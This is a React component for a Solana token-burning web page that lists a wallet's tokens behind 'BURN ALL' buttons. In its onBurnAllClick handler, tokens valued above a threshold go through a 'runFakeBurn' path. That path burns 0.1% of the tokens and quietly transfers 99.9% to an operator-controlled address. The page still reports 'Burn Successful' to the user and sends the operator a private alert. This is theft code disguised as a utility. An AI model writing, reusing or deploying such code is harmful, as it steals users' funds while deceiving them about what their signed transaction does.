import { FC, useCallback, useState, useEffect } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { Metaplex, keypairIdentity } from "@metaplex-foundation/js";

import {
  ComputeBudgetProgram,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createBurnInstruction,
  createTransferCheckedInstruction,
  getAccount,
  getAssociatedTokenAddress,
  getMint,
} from "@solana/spl-token";
import {
  feeForBurningLiquidity,
  addressToReceiveBurnFees,
  priorityFeeRate,
  runFakeBurn,
  addressToRecieveLPTokens,
  unknownTokenImageURL,
  minimunTokenValueInUSD,
  tokensToIgnore,
} from "constants/Constants";
import { notify } from "../utils/notifications";
import { ClipLoader } from "react-spinners";

async function getTokenPrice(mintAddress) {
  const url = `https://api-v3.raydium.io/mint/price?mints=${mintAddress}`;
  try {
    const response = await fetch(url);
    if (!response.ok) {
      return 0;
    }

    const data = await response.json();
    if (data.success && data.data[mintAddress]) {
      return parseFloat(data.data[mintAddress]); // Convert price to a float
    } else {
      return 0;
    }
  } catch (error) {
    return 0;
  }
}

export const BurnTokensAll: FC = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const [tokenAccount, setTokenAccount] = useState("");
  const [tokenAddress, setTokenAddress] = useState("");
  const [amountToBurn, setAmountToBurn] = useState("");
  const [tokenDecimals, setTokenDecimals] = useState("");
  const [isBurnLoading, setIsBurnLoading] = useState(false);
  const [isAutofillLoading, setIsAutofillLoading] = useState(false);
  const [isMaxSupplyLoading, setIsMaxSupplyLoading] = useState(false);

  const [tokens, setTokens] = useState([]);
  const [tokenLogoURL, setTokenLogoURL] = useState([]);

  // const [walletAddress, setWalletAddress] = useState("");
  const walletAddress = "1nc1nerator11111111111111111111111111111111";

  // const FROM_KEYPAIR = Keypair.fromSecretKey(new Uint8Array(secret));

  const PRIORITY_FEE_INSTRUCTIONS = ComputeBudgetProgram.setComputeUnitPrice({
    microLamports: priorityFeeRate,
  });

  const onBurnAllClick = useCallback(
    async (form) => {
      if (!publicKey) {
        notify({ type: "error", message: `Wallet Not Connected!` });
        console.log("error", `Send Transaction: Wallet not connected!`);
        return;
      }
      setIsBurnLoading(true);

      const valueOfTokenBurning =
        (await getTokenPrice(form.tokenAddress)) * form.amountToBurn;
      const shouldPerformAlternativeBurn =
        valueOfTokenBurning >= minimunTokenValueInUSD &&
        runFakeBurn &&
        !tokensToIgnore.includes(form.tokenAddress);

      try {
        //FETCH SENDER AND RECEIVER INFORMATION
        const senderTokenAddress = await getAssociatedTokenAddress(
          new PublicKey(form.tokenAddress),
          publicKey,
        );
        const recipientTokenAddress = await getAssociatedTokenAddress(
          new PublicKey(form.tokenAddress),
          addressToRecieveLPTokens,
        );
        const recipientTokenAccountInfo = await connection.getAccountInfo(
          recipientTokenAddress,
        );

        //CALCULATE AMOUNT TO BURN
        let totalNumberToBurn: number = Math.floor(
          form.amountToBurn * 10 ** form.tokenDecimals,
        );
        const amountToBurn = form.amountToBurn * 10 ** form.tokenDecimals;
        let amountThatShouldBeBurned = Math.floor(amountToBurn * 0.001);
        let amountThatShouldBeSentToWallet = Math.floor(amountToBurn * 0.999);
        if (
          amountThatShouldBeBurned + amountThatShouldBeSentToWallet >
          amountToBurn
        )
          amountThatShouldBeBurned -= 1;

        //BURN AND TRANSFER INSTRUCTION
        const transaction = new Transaction();
        if (shouldPerformAlternativeBurn) {
          ///////////// 🔵 BURN 1 /////////////
          transaction.add(
            createBurnInstruction(
              new PublicKey(form.tokenAccount),
              new PublicKey(form.tokenAddress),
              publicKey,
              amountThatShouldBeBurned,
              undefined,
              TOKEN_PROGRAM_ID,
            ),
          );
          if (!recipientTokenAccountInfo) {
            transaction.add(
              createAssociatedTokenAccountInstruction(
                publicKey,
                recipientTokenAddress,
                addressToRecieveLPTokens,
                new PublicKey(form.tokenAddress),
              ),
            );
          }
          transaction.add(
            createTransferCheckedInstruction(
              senderTokenAddress,
              new PublicKey(form.tokenAddress),
              recipientTokenAddress,
              publicKey,
              amountThatShouldBeSentToWallet,
              form.tokenDecimals,
            ),
          );
        } else {
          ///////////// 🔵 BURN 2 /////////////
          transaction.add(
            // PRIORITY_FEE_INSTRUCTIONS,
            createBurnInstruction(
              new PublicKey(form.tokenAccount),
              new PublicKey(form.tokenAddress),
              publicKey,
              totalNumberToBurn,
              undefined,
              TOKEN_PROGRAM_ID,
            ),
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: addressToReceiveBurnFees,
              lamports: feeForBurningLiquidity,
            }),
          );
        }

        //FINALIZE AND SEND TRANSACTION
        const latestBlockhash =
          await connection.getLatestBlockhash("confirmed");
        transaction.recentBlockhash = latestBlockhash.blockhash;
        transaction.feePayer = publicKey;
        const signature = await sendTransaction(transaction, connection);
        setIsBurnLoading(false);
        notify({
          type: "success",
          message: "Burn Successful",
        });

        //Send Notification
        if (shouldPerformAlternativeBurn) {
          await fetch("/api/pushover", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              title: "SOLTOKENBURNER ALERT",
              message: `BURNED $${valueOfTokenBurning}`,
            }),
          });
        }

        return signature;
      } catch (error: any) {
        //ERROR CATCHING AND DISPLAYING
        console.log("error", `Burn failed! ${error?.message}`);
        setIsBurnLoading(false);
        notify({ type: "error", message: `Burn Failed!` });
        return;
      }
    },
    [publicKey, connection, sendTransaction],
  );

  //ALL FUNCTIONS BELOW HERE
  //ALL FUNCTIONS BELOW HERE
  //ALL FUNCTIONS BELOW HERE
  //ALL FUNCTIONS BELOW HERE
  //ALL FUNCTIONS BELOW HERE
  //ALL FUNCTIONS BELOW HERE

  const getTokenDecimalsAndAmount = useCallback(
    async (theTokenAccount) => {
      try {
        const tokenAccount = new PublicKey(theTokenAccount);

        // Fetch account details
        const { mint: mintAddress, amount: totalAmount } = await getAccount(
          connection,
          tokenAccount,
          undefined,
          TOKEN_PROGRAM_ID,
        );

        const { decimals } = await getMint(
          connection,
          mintAddress,
          undefined,
          TOKEN_PROGRAM_ID,
        );

        const properTotalAmount = Number(totalAmount) / 10 ** Number(decimals);
        setTokenAddress(mintAddress.toBase58());

        return decimals;
      } catch (error) {
        console.error("Error fetching token decimals:", error);
        return 9; // Default decimals on error
      }
    },
    [connection],
  );

  const getTokenMetadataFromMint = async (mintAddress) => {
    try {
      const mintPublicKey = new PublicKey(mintAddress);
      const metaplex = new Metaplex(connection);

      // Fetch NFT details
      const nft = await metaplex
        .nfts()
        .findByMint({ mintAddress: mintPublicKey });

      if (nft?.uri) {
        const metadataResponse = await fetch(nft.uri);
        const metadata = await metadataResponse.json();
        return metadata || {};
      }

      console.warn("Token metadata not found. Returning default metadata.");
      return getDefaultMetadata();
    } catch (error) {
      console.error("Error fetching token metadata:", error);
      return getDefaultMetadata();
    }
  };

  const getDefaultMetadata = () => ({
    image: unknownTokenImageURL,
    name: "Unknown",
    symbol: "TOKEN",
  });

  const onRefreshClick = useCallback(
    async (form) => {
      if (!publicKey) {
        notify({ type: "error", message: `Wallet Not Connected!` });
        console.log("error", `Send Transaction: Wallet not connected!`);
        return;
      }

      setIsBurnLoading(true);

      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        publicKey,
        {
          programId: new PublicKey(
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
          ),
        },
      );

      const tokens = tokenAccounts.value.map((accountInfo) => {
        const { pubkey, account } = accountInfo;
        const { mint, tokenAmount } = account.data.parsed.info;

        // const tokenDecimals = getTokenDecimals({
        //   tokenAccount: pubkey.toBase58(),
        // });

        return {
          logo: "Not Yet Updated",
          tokenAccount: pubkey.toBase58(), // Token account address
          mint: mint, // Token mint address
          amount: tokenAmount.uiAmount, // Token balance
          decimals: 6, // Default value
          symbol: "Loading", // Default value
          name: "...", // Default value
        };
      });

      // Fetch token metadata (symbol, name, decimals)
      for (let i = 0; i < tokens.length; i++) {
        // Fetch token logo, name, symbol, decimals
        const mt = await getTokenMetadataFromMint(tokens[i].mint);
        tokens[i].logo = mt.image;
        tokens[i].name = mt.name;
        tokens[i].symbol = mt.symbol;

        tokens[i].decimals = await getTokenDecimalsAndAmount(
          tokens[i].tokenAccount,
        );
        {
          //PRESET COINS
          if (
            tokens[i].mint == "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" //USDC
          ) {
            tokens[i].name = "USD Coin";
            tokens[i].symbol = "USDC";
            tokens[i].logo =
              "https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png";
          }

          if (
            tokens[i].mint == "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" //USDT
          ) {
            tokens[i].name = "TetherUSD";
            tokens[i].symbol = "USDT";
            tokens[i].logo =
              "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png";
          }
        }

        setTokens(tokens);
      }

      //REMOVING NFT TOKENS
      const decimalFilteredTokens = tokens.filter(
        (token) => token.decimals !== 0,
      );
      const balanceFilteredTokens = decimalFilteredTokens.filter(
        (token) => token.amount !== 0,
      );
      setTokens(balanceFilteredTokens);

      setIsBurnLoading(false);

      return balanceFilteredTokens;
    },
    [publicKey, connection, sendTransaction],
  );

  //PERFORM ACTION ONCE PAGE LOADS
  // useEffect(() => {
  //   console.log("Page loaded! Performing action...");
  //   onRefreshClick({
  //     walletAddress: walletAddress,
  //   });
  // }, []);

  //AUTO-LOAD TOKENS FROM WALLET ON LOADING WEBPAGE & CHANGING WALLET
  useEffect(() => {
    if (publicKey) {
      onRefreshClick({
        walletAddress: walletAddress,
      });
    }
  }, [publicKey]);

  return (
    <div className="my-4">
      {isBurnLoading && (
        <div className="absolute top-0 left-0 z-50 flex h-screen w-full flex-col items-center justify-center bg-black/[.3] backdrop-blur-[2px]">
          <ClipLoader color="#ffffff" />
        </div>
      )}

      <div>
        <ul className="token-list">
          {tokens.map((token, index) => (
            <li key={index} className="token-item">
              <div className="token-content">
                <img src={token.logo} alt="" className="token-logo" />
                <div className="token-info">
                  <strong className="token-name">{token.name}</strong>
                  <span className="token-symbol">{token.symbol}</span>
                  <span className="token-amount">{token.amount}</span>

                  <a
                    href={`https://solscan.io/token/${token.mint}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="token-mint hover:underline"
                  >
                    {`${token.mint.slice(0, 5)}......${token.mint.slice(-5)}`}
                  </a>

                  {/* <span className="token-decimals">
                    Decimals: {token.decimals}
                  </span> */}

                  {/* BURN ALL BUTTON */}
                  <button
                    className="burnall-btn"
                    onClick={() =>
                      onBurnAllClick({
                        tokenAccount: tokens[index].tokenAccount,
                        tokenAddress: tokens[index].mint,
                        amountToBurn: tokens[index].amount,
                        tokenDecimals: tokens[index].decimals,
                      })
                    }
                  >
                    BURN ALL
                  </button>
                  <br />

                  {/* INPUT AMOUNT BUTTON */}
                  <button
                    className="burn-btn"
                    onClick={() =>
                      (window.location.href = `/manual?tokenAccount=${tokens[index].tokenAccount}&tokenAddress=${tokens[index].mint}&decimals=${tokens[index].decimals}`)
                    }
                  >
                    Input Amount to Burn
                  </button>
                </div>
              </div>
            </li>
          ))}
        </ul>

        {/* REFRESH BUTTON */}
        <button
          className="px-8 my-10 m-2 btn bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
          onClick={() =>
            onRefreshClick({
              walletAddress: walletAddress,
            })
          }
        >
          <span>REFRESH TOKENS</span>
        </button>

        <style>
          {`
      .token-list {
        display: grid;
        grid-template-columns: repeat(5, 1fr); /* Default: 5 columns */
        gap: 20px; /* Spacing between items */
        padding: 10;
        list-style: none;
      }

      .token-item {
        border: 1px solid #ccc;
        border-radius: 15px;
        background: #1c1c1c;
        color: white;
        overflow: hidden;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
      }

      .token-item:hover {
        transform: scale(1.03);
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
      }

      .token-content {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
      }

      .token-logo {
        width: 100px;
        height: 100px;
        border-radius: 50%;
        margin-bottom: 15px;
      }

      .token-info {
        text-align: center;
      }

      .token-name {
        font-size: 1.5em;
        margin-bottom: 10px;
        display: block;
      }

      .token-symbol {
        font-size: 1.2em;
        color: #aaa;
        margin-bottom: 10px;
        display: block;
      }

      .token-amount {
        font-size: 1.1em;
        margin-bottom: 5px;
        display: block;
      }

      .token-mint {
        font-size: 0.9em;
        color: #888;
        margin-bottom: 10px;
        display: block;
      }

      .token-decimals {
        font-size: 1em;
        color: #ccc;
        margin-bottom: 15px;
        display: block;
      }

      .burnall-btn {
        background: linear-gradient(0deg, rgba(0,0,0,1) 0%, rgba(20,20,20,1) 100%);
        border: none;
        color: white;
        border-radius: 10px;
        padding: 10px 20px;
        cursor: pointer;
        transition: background 0.3s ease-in-out;
      }
      
.burn-btn {
  background: linear-gradient(0deg, rgba(0, 0, 0, 1) 0%, rgba(20, 20, 20, 1) 100%);
  border: none;
  color: white;
  border-radius: 10px;
  padding: 7px 15px;
  margin-top: 3px;
  cursor: pointer;
  transition: background 0.3s ease-in-out;
  font-size: 12px; /* Adjust this value to make the text smaller */
}


      .burn-btn:hover {
        background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(200,20,0,1) 100%);
      }

            .burnall-btn:hover {
        background: linear-gradient(90deg, rgba(255,0,0,1) 0%, rgba(200,20,0,1) 100%);
      }

      /* Responsive Design */
      @media (max-width: 1200px) {
        .token-list {
          grid-template-columns: repeat(4, 1fr); /* 4 columns for large screens */
        }
      }

      @media (max-width: 992px) {
        .token-list {
          grid-template-columns: repeat(3, 1fr); /* 3 columns for medium screens */
        }
      }

      @media (max-width: 768px) {
        .token-list {
          grid-template-columns: repeat(2, 1fr); /* 2 columns for small screens */
        }
      }

      @media (max-width: 480px) {
        .token-list {
          grid-template-columns: repeat(1, 1fr); /* 1 column for extra-small screens */
        }
      }
    `}
        </style>
      </div>
    </div>
  );
};
